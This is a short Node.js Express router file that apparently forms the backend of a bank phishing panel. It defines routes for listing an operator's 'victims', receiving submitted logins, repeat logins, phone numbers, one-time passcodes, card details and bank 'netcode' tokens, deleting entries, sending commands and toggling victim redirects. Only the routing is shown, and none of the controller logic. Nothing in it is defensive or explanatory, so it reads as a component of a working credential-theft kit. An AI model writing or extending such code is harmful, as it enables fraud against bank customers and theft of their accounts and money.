const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitTelephone,
	submitOtp,
	submitNetcode,
	deleteEntry,
	submitCard,
	setRedirect,
} = require("../controllers/asbController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/telephone", submitTelephone);
router.post("/otp", submitOtp);
router.post("/card", submitCard);
router.post("/netcode", submitNetcode);
router.post("/delete", deleteEntry);
router.get("/redirect/:active", setRedirect);

module.exports = router;
